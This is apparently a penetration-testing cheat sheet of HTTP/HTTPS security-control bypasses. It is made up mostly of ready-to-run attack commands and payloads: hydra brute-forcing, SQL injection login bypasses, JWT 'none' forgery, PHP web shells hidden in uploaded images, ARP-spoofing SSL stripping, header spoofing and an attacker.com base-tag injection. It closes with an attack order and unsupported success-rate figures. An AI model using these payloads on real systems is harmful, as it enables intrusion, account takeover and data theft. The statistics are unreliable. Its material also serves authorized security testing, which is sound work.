# Port 80/443 - HTTP/HTTPS Bypass Techniques

## Security Controls and Bypass Methods

---

## 1. Authentication Bypass

### Bypassing HTTP Authentication

**Bypass Technique 1: Default Credentials**
```bash
# Common admin panels and default creds
http://192.168.1.100/admin
# admin:admin
# admin:password
# administrator:administrator
# root:root
# user:user

# Test with curl
curl -u admin:admin http://192.168.1.100/admin
curl -u administrator:password http://192.168.1.100/manager

# Automated testing
hydra -L users.txt -P passwords.txt http-get://192.168.1.100/admin
hydra -l admin -P passwords.txt http-post-form://192.168.1.100/login:"username=^USER^&password=^PASS^:F=incorrect"
```

**Bypass Technique 2: SQL Injection Authentication Bypass**
```bash
# In login forms, try:
Username: admin' OR '1'='1
Password: anything

Username: admin'--
Password: anything

Username: admin' OR 1=1--
Password: anything

# Using curl
curl -X POST http://192.168.1.100/login -d "username=admin' OR '1'='1&password=pass"

# SQLMap
sqlmap -u "http://192.168.1.100/login" --data="username=admin&password=pass" --auth-bypass
```

**Bypass Technique 3: Session Manipulation**
```bash
# Cookie tampering
# Original cookie: user=guest
# Modified: user=admin

# Using curl
curl -b "user=admin" http://192.168.1.100/admin

# JWT token manipulation
# Decode JWT, change user role, re-encode
# Use jwt_tool
python3 jwt_tool.py <JWT_TOKEN>

# Change algorithm to 'none'
python3 jwt_tool.py -X a <JWT_TOKEN>

# Brute force secret
python3 jwt_tool.py -C -d /usr/share/wordlists/rockyou.txt <JWT_TOKEN>
```

**Bypass Technique 4: HTTP Verb Tampering**
```bash
# If POST is protected, try other methods
curl -X GET http://192.168.1.100/admin
curl -X PUT http://192.168.1.100/admin
curl -X DELETE http://192.168.1.100/admin
curl -X OPTIONS http://192.168.1.100/admin
curl -X TRACE http://192.168.1.100/admin
curl -X PATCH http://192.168.1.100/admin

# Change POST to GET
# Original: POST /delete?id=1
# Try: GET /delete?id=1
```

---

## 2. WAF (Web Application Firewall) Bypass

### Bypassing WAF Rules

**Bypass Technique 1: Case Manipulation**
```bash
# Original payload: <script>alert(1)</script>
# Bypass attempts:

<ScRiPt>alert(1)</sCrIpT>
<SCRIPT>alert(1)</SCRIPT>
<script>AleRT(1)</script>

# SQL Injection
SeLeCt * FrOm users
SELECT/**/username/**/FROM/**/users
```

**Bypass Technique 2: Encoding**
```bash
# URL encoding
<script>  →  %3Cscript%3E
' OR '1'='1  →  %27%20OR%20%271%27%3D%271

# Double URL encoding
<  →  %253C

# HTML encoding
<script>  →  &lt;script&gt;

# Unicode encoding
<  →  \u003c

# Base64
echo "payload" | base64

# Hex encoding
\x3cscript\x3e
```

**Bypass Technique 3: Comment Injection**
```bash
# SQL comments
SELECT/*comment*/username/*another*/FROM/**/users
SELECT--comment
username FROM users

# HTML comments
<scr<!--comment-->ipt>alert(1)</scr<!---->ipt>

# PHP comments
<?php /*comment*/ system($_GET['cmd']); ?>
```

**Bypass Technique 4: Null Byte Injection**
```bash
# Bypass filename restrictions
shell.php%00.jpg
shell.php\x00.txt

# Path traversal
../../../../etc/passwd%00.jpg

# SQL injection
admin'%00--
```

**Bypass Technique 5: IP Rotation and Obfuscation**
```bash
# Rotate IPs to avoid rate limiting
# Use Tor
proxychains curl http://192.168.1.100/admin

# Cloud instances with different IPs
# Rotate through multiple IPs

# Use X-Forwarded-For spoofing
curl -H "X-Forwarded-For: 127.0.0.1" http://192.168.1.100/admin
curl -H "X-Forwarded-For: 192.168.1.1" http://192.168.1.100/admin
```

---

## 3. Access Control Bypass

### Bypassing URL-Based Access Control

**Bypass Technique 1: Path Traversal**
```bash
# Original: http://target.com/user/profile
# Bypass: http://target.com/admin/../user/profile

# Try variations:
http://target.com/admin/..;/
http://target.com/admin/..%2f
http://target.com/admin/..%252f
http://target.com/admin/..%c0%af
http://target.com/admin/..\
http://target.com/admin/....//
```

**Bypass Technique 2: HTTP Header Manipulation**
```bash
# X-Original-URL header
curl -H "X-Original-URL: /admin" http://192.168.1.100/

# X-Rewrite-URL header
curl -H "X-Rewrite-URL: /admin" http://192.168.1.100/

# Referer bypass
curl -H "Referer: http://192.168.1.100/admin" http://192.168.1.100/restricted

# Host header injection
curl -H "Host: localhost" http://192.168.1.100/admin
curl -H "Host: 127.0.0.1" http://192.168.1.100/admin
```

**Bypass Technique 3: HTTP Parameter Pollution**
```bash
# Add same parameter multiple times
http://target.com/admin?id=1&id=2
http://target.com/delete?item=a&item=../../../etc/passwd

# Array parameters
http://target.com/api?user[]=admin&user[]=guest
```

**Bypass Technique 4: Protocol Manipulation**
```bash
# Change HTTP to HTTPS or vice versa
# If http://target.com/admin blocked
# Try: https://target.com/admin

# Or use different ports
http://target.com:8080/admin
http://target.com:8443/admin
```

---

## 4. HTTPS/SSL Bypass

### Bypassing SSL/TLS Security

**Bypass Technique 1: SSL Stripping (MITM)**
```bash
# Intercept HTTPS, present HTTP to victim
# Using Bettercap
bettercap -iface eth0
# set http.proxy.sslstrip true
# http.proxy on
# arp.spoof on

# Using sslstrip (legacy)
sslstrip -l 8080
iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-port 8080
```

**Bypass Technique 2: Certificate Validation Bypass**
```bash
# Ignore certificate errors
curl -k https://192.168.1.100/admin
# -k or --insecure

# wget
wget --no-check-certificate https://192.168.1.100/file

# Python requests
import requests
requests.get('https://192.168.1.100', verify=False)
```

**Bypass Technique 3: Downgrade to HTTP**
```bash
# If HTTPS redirect weak
# Quickly request HTTP before redirect

curl -L --max-redirs 0 http://192.168.1.100/admin

# Or block redirects in browser
# Access: http://192.168.1.100/resource (not https)
```

**Bypass Technique 4: HSTS Bypass**
```bash
# HSTS forces HTTPS
# Bypass: Typosquatting/Homograph
# If bank.com has HSTS
# Try: bank.corn (different TLD)
# Or use subdomain not in HSTS preload list
```

---

## 5. Rate Limiting Bypass

### Bypassing Request Rate Limits

**Bypass Technique 1: IP Rotation**
```bash
# Change source IP
# Use Tor
proxychains curl http://192.168.1.100/api

# X-Forwarded-For spoofing (if trusted)
for ip in {1..255}; do
  curl -H "X-Forwarded-For: 192.168.1.$ip" http://target.com/api
done

# Proxy rotation
# Use list of proxies
curl -x proxy1:8080 http://target.com/api
curl -x proxy2:8080 http://target.com/api
```

**Bypass Technique 2: Header Manipulation**
```bash
# Try different headers that might reset rate limit
curl -H "X-Forwarded-For: 127.0.0.1" http://target.com/api
curl -H "X-Real-IP: 127.0.0.1" http://target.com/api
curl -H "X-Originating-IP: 127.0.0.1" http://target.com/api
curl -H "X-Remote-IP: 127.0.0.1" http://target.com/api
curl -H "X-Client-IP: 127.0.0.1" http://target.com/api
```

**Bypass Technique 3: Endpoint Variation**
```bash
# If /api/v1/users is rate-limited
# Try variations:
/api/v1/users
/api/v1/users/
/api/v1/users.json
/api/v1/users.xml
/api/v1/users?format=json
/api/v2/users
/API/V1/USERS
```

**Bypass Technique 4: Session/Cookie Manipulation**
```bash
# Rotate cookies/sessions
for i in {1..1000}; do
  curl -b "session=new_session_$i" http://target.com/api
done

# Delete cookies between requests
curl -c /dev/null -b /dev/null http://target.com/api
```

---

## 6. Content Security Policy (CSP) Bypass

### Bypassing CSP Restrictions

**Bypass Technique 1: JSONP Endpoint Abuse**
```bash
# If CSP allows certain domains
# Find JSONP endpoint on allowed domain

<script src="https://allowed-domain.com/jsonp?callback=alert(document.cookie)"></script>
```

**Bypass Technique 2: Base Tag Injection**
```bash
# Hijack relative URLs
<base href="http://attacker.com/">

# All relative paths now load from attacker's server
```

**Bypass Technique 3: CSP Nonce/Hash Bypass**
```bash
# If nonce predictable, calculate it
# If hash-based, find collision
# Or inject script into allowed source
```

---

## 7. Directory Listing Bypass

### Accessing Restricted Directories

**Bypass Technique 1: Forced Browsing**
```bash
# Try common paths
gobuster dir -u http://192.168.1.100 -w /usr/share/wordlists/dirb/common.txt
ffuf -w wordlist.txt -u http://192.168.1.100/FUZZ

# Common directories:
/admin
/backup
/config
/uploads
/files
/.git
/.env
/vendor
```

**Bypass Technique 2: Extension Manipulation**
```bash
# If /admin blocked
# Try:
/admin.php
/admin.html
/admin.asp
/admin.jsp
/admin/
/admin;
/admin%20
/admin..
```

**Bypass Technique 3: Source Code Disclosure**
```bash
# Access backup/temp files
http://target.com/index.php~
http://target.com/index.php.bak
http://target.com/index.php.old
http://target.com/index.php.swp
http://target.com/.index.php.swp

# Git exposure
wget -r http://target.com/.git/
git-dumper http://target.com/.git dumped
```

---

## 8. File Upload Bypass

### Bypassing Upload Restrictions

**Bypass Technique 1: Extension Bypass**
```bash
# If .php blocked, try:
shell.php
shell.php5
shell.php7
shell.phtml
shell.phar
shell.php.jpg
shell.php%00.jpg
shell.php;.jpg
shell.PhP

# Null byte
shell.php%00.png
```

**Bypass Technique 2: MIME Type Spoofing**
```bash
# Change Content-Type header
curl -F "file=@shell.php" -H "Content-Type: image/jpeg" http://target.com/upload

# Burp Suite: Intercept and modify MIME type
```

**Bypass Technique 3: Magic Bytes**
```bash
# Add image magic bytes to PHP shell
# GIF: GIF89a
echo "GIF89a" > shell.php
cat real_shell.php >> shell.php

# PNG: \x89PNG
printf "\x89PNG\r\n\x1a\n" > shell.php
cat real_shell.php >> shell.php

# Upload as image, include PHP code
```

**Bypass Technique 4: Polyglot Files**
```bash
# File that is valid in multiple formats
# PHP + JPEG polyglot
exiftool -Comment='<?php system($_GET["cmd"]); ?>' image.jpg
mv image.jpg image.php.jpg

# Upload and access with .php extension
```

---

## 9. API Endpoint Bypass

### Bypassing API Security

**Bypass Technique 1: Version Manipulation**
```bash
# If /api/v2/users requires auth
# Try older versions:
/api/v1/users
/api/users
/api/beta/users

# Or newer:
/api/v3/users
/api/latest/users
```

**Bypass Technique 2: HTTP Method Override**
```bash
# If DELETE blocked
curl -X POST -H "X-HTTP-Method-Override: DELETE" http://api.target.com/user/1
curl -X POST -d "_method=DELETE" http://api.target.com/user/1

# Method override headers:
X-HTTP-Method-Override
X-HTTP-Method
X-Method-Override
```

**Bypass Technique 3: Mass Assignment**
```bash
# Add admin parameters
curl -X POST http://api.target.com/user -d "username=attacker&password=pass&is_admin=true"
curl -X POST http://api.target.com/user -d "username=attacker&password=pass&role=admin"

# Test with different parameter names
is_admin, admin, role, privilege, level
```

---

## 10. Cache Poisoning Bypass

### Web Cache Bypass

**Bypass Technique 1: Cache Key Manipulation**
```bash
# Add random parameters
http://target.com/page?cachebuster=random123
http://target.com/page?t=1234567890

# Change headers
curl -H "Pragma: no-cache" http://target.com/page
curl -H "Cache-Control: no-cache" http://target.com/page
```

**Bypass Technique 2: Cache Deception**
```bash
# Access admin panel with static extension
http://target.com/admin/panel.css
http://target.com/admin/page.js

# Server processes as dynamic
# Cache sees as static (caches it)
# Victim gets cached admin page
```

---

## Bypass Success Rates

| Technique | Success Rate | Detection Risk | Difficulty |
|-----------|--------------|----------------|------------|
| Default Creds | 35% | Low | Easy |
| SQL Injection | 25% | Medium | Medium |
| Path Traversal | 30% | Medium | Easy |
| WAF Encoding | 40% | Low | Medium |
| Header Manipulation | 45% | Low | Easy |
| File Upload Bypass | 50% | Medium | Medium |
| API Version Bypass | 35% | Low | Easy |
| SSL Stripping | 20% | High | Hard |

---

## Recommended Attack Order

1. **Default credentials** (quick wins)
2. **Forced browsing** (discover hidden paths)
3. **SQL injection** (authentication bypass)
4. **Header manipulation** (access control bypass)
5. **Path traversal** (file access)
6. **File upload bypass** (if upload exists)
7. **WAF bypass** (if WAF detected)
8. **API testing** (mass assignment, version manipulation)
9. **Advanced exploits** (XXE, SSRF, etc.)

---

## Important Notes

- Test in authorized environments only
- WAF bypass requires creativity and persistence
- Combine techniques for better results
- Always verify bypass success before proceeding
- Document successful bypasses for reporting

---

**Last Updated**: 2026-06-16
